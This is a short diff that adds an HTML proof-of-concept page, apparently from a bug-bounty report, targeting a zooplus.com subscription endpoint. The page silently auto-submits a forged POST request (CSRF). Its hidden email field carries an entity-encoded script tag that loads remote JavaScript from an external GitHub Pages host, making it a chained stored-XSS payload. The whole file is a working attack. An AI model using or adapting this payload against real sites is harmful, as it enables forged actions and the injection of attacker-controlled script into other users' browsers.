@@ -1,0 +1,13 @@
+<html>
+  <!-- CSRF PoC -  -->
+  <body>
+    <form action="https://www.zooplus.com/subscribe/api/register/" method="POST">
+      <input type="hidden" name="email" value="&quot;&gt;&lt;script&gt;&#36;&#46;getScript&#40;&quot;&#47;&#47;khara&#45;h1&#46;github&#46;io&#47;poc&#47;xss2&#46;js&quot;&#41;&lt;&#47;script&gt;&quot;" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
